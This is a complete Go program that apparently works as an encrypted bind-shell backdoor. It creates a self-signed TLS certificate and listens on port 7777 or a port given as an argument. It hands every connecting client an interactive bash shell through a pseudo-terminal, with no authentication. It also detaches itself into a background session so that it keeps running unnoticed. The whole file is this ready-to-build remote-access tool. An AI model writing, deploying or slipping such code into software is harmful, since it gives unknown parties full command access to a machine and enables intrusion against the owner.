package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/creack/pty"
)

type Peer struct {
	conn net.Conn
	app  *App
}

type App struct {
	listenAddr string
	ln         net.Listener

	mu    sync.Mutex
	peers []*Peer
}

func certificate() (*tls.Config, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	tempForCert := x509.Certificate{
		SerialNumber: big.NewInt(1),
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
	}

	bytes, err := x509.CreateCertificate(rand.Reader, &tempForCert, &tempForCert, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, err
	}

	return &tls.Config{
		Certificates: []tls.Certificate{
			{
				Certificate: [][]byte{bytes},
				PrivateKey:  privateKey,
			},
		},
	}, nil
}

func newApp(listenAddr string) *App {
	return &App{
		listenAddr: listenAddr,
	}
}

func address() string {
	if len(os.Args) > 1 && os.Args[1] != "" {
		argument := os.Args[1]

		if strings.Contains(argument, ":") {
			return argument
		}
		return ":" + argument
	}

	return ":7777"
}

func (a *App) start() error {
	conf, err := certificate()
	if err != nil {
		return err
	}

	ln, err := tls.Listen("tcp", a.listenAddr, conf)
	if err != nil {
		return err
	}

	a.ln = ln
	defer ln.Close()

	return a.accept()
}

func (a *App) addNewPeer(conn net.Conn) *Peer {
	peer := newPeer(a, conn)
	a.mu.Lock()
	a.peers = append(a.peers, peer)
	a.mu.Unlock()
	return peer
}

func (a *App) removePeer(p *Peer) {
	a.mu.Lock()
	defer a.mu.Unlock()

	for i, peer := range a.peers {
		if peer == p {
			a.peers = append(a.peers[:i], a.peers[i+1:]...)
			return
		}
	}
}

func (p *Peer) handle() error {
	defer p.app.removePeer(p)

	cmd := exec.Command("bash")

	pty, err := pty.Start(cmd)
	if err != nil {
		p.conn.Close()
		return err
	}

	defer func() {
		_ = p.conn.Close()
		_ = pty.Close()
		if cmd.Process != nil {
			_ = cmd.Process.Kill()
		}
		_ = cmd.Wait()
	}()

	errCh := make(chan error, 2)

	go func() {
		_, err := io.Copy(pty, p.conn)
		errCh <- err
	}()

	go func() {
		_, err := io.Copy(p.conn, pty)
		errCh <- err
	}()

	return <-errCh
}

func (a *App) accept() error {
	for {
		conn, err := a.ln.Accept()
		if err != nil {
			continue
		}

		peer := a.addNewPeer(conn)

		go peer.handle()

	}
}

func newPeer(app *App, conn net.Conn) *Peer {
	return &Peer{
		conn: conn,
		app:  app,
	}
}

func makeDaemon() error {
	if os.Getenv("socket") == "1" {
		return nil
	}

	cmd := exec.Command(os.Args[0], os.Args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	cmd.Env = append(os.Environ(), "socket=1")

	cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, nil, nil

	if err := cmd.Start(); err != nil {
		return err
	}
	os.Exit(0)

	return nil
}

func main() {
	makeDaemon()
	addr := address()
	app := newApp(addr)
	if err := app.start(); err != nil {
		panic(err)
	}
}
